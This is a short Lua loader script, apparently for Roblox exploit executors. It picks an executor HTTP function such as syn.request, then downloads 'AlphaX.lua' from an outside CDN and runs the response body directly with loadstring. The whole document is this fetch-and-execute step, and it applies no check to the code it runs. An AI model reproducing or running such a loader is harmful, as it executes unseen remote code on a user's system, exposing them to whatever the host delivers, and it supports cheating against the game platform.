getgenv().http_request = http_request or request or (http and http.request) or syn.request 
repeat until http_request
loadstring(http_request({Url="https://cdn.applebee1558.com/alphax/AlphaX.lua",Method="GET"}).Body)()